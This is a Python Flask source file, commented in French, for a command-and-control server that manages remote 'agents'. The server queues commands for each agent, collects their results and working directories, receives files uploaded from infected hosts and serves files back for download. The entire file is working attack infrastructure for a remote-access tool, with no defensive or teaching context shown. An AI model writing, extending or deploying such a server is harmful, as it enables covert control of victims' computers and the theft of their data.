"""
Serveur API pour les agents C2
Port: 1234
"""
from flask import Flask, request, send_from_directory
from werkzeug.utils import secure_filename
import os
import time
import threading
import logging

# Configuration du logging
logging.basicConfig(
    filename='server.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

app = Flask(__name__)

# Configuration
UPLOAD_FOLDER = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'uploads')
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

SECRET_TOKEN = "change-me-in-production"
AGENT_TIMEOUT = 300  # 5 minutes

# Stockage en mémoire
CMD_INPUT = {}      # {agent_id: "commande"}
CMD_OUTPUT = {}     # {agent_id: "résultat"}
CURRENT_DIRS = {}   # {agent_id: "C:\\path"}
AGENT_STATUS = {}   # {agent_id: timestamp}

# Lock pour thread-safety
DATA_LOCK = threading.Lock()

def cleanup_dead_agents():
    """Nettoie les agents inactifs"""
    while True:
        time.sleep(60)
        with DATA_LOCK:
            now = time.time()
            dead = [aid for aid, last in AGENT_STATUS.items() if now - last > AGENT_TIMEOUT]
            for aid in dead:
                logging.info(f"Cleaning dead agent: {aid}")
                AGENT_STATUS.pop(aid, None)
                CMD_INPUT.pop(aid, None)
                CMD_OUTPUT.pop(aid, None)
                CURRENT_DIRS.pop(aid, None)

# Thread de nettoyage
threading.Thread(target=cleanup_dead_agents, daemon=True).start()

@app.route('/register', methods=['POST'])
def register():
    """Enregistre un agent"""
    agent_id = request.form.get("id")
    cwd = request.form.get("cwd", "?")
    
    if not agent_id:
        return "Missing agent ID", 400
    
    with DATA_LOCK:
        AGENT_STATUS[agent_id] = time.time()
        CURRENT_DIRS[agent_id] = cwd
    
    logging.info(f"Agent registered: {agent_id} from {request.remote_addr}")
    return "OK", 200

@app.route('/get_command', methods=['GET'])
def get_command():
    """L'agent récupère sa prochaine commande"""
    agent_id = request.args.get("id")
    if not agent_id:
        return "Missing agent ID", 400
    
    with DATA_LOCK:
        AGENT_STATUS[agent_id] = time.time()
        cmd = CMD_INPUT.get(agent_id)
    
    if not cmd:
        return "", 204  # No command
    
    logging.info(f"Command sent to {agent_id}: {cmd[:50]}")
    return cmd, 200

@app.route('/post_result', methods=['POST'])
def post_result():
    """L'agent envoie le résultat d'une commande"""
    agent_id = request.form.get("id")
    output = request.form.get("output", "")
    cwd = request.form.get("cwd", "?")
    
    if not agent_id:
        return "Missing agent ID", 400
    
    with DATA_LOCK:
        CMD_OUTPUT[agent_id] = output
        CURRENT_DIRS[agent_id] = cwd
        AGENT_STATUS[agent_id] = time.time()
        CMD_INPUT.pop(agent_id, None)  # Clear la commande
    
    logging.info(f"Result from {agent_id}: {len(output)} bytes")
    return "OK", 200

@app.route('/upload', methods=['POST'])
def upload():
    """Reçoit un fichier uploadé"""
    agent_id = request.args.get("id", "unknown")
    file = request.files.get('file')
    
    if not file:
        return "No file", 400
    
    safe_name = secure_filename(file.filename)
    if not safe_name:
        return "Invalid filename", 400
    
    filename = f"{agent_id}_{safe_name}"
    filepath = os.path.join(UPLOAD_FOLDER, filename)
    
    file.save(filepath)
    logging.info(f"File uploaded: {filename}")
    return "OK", 200

@app.route('/download/<filename>')
def download(filename):
    """Télécharge un fichier"""
    safe_name = secure_filename(filename)
    if not safe_name or safe_name != filename:
        return "Invalid filename", 400
    
    return send_from_directory(UPLOAD_FOLDER, safe_name, as_attachment=True)

if __name__ == "__main__":
    logging.info("Server starting on 0.0.0.0:1234")
    app.run(host="0.0.0.0", port=1234, debug=False)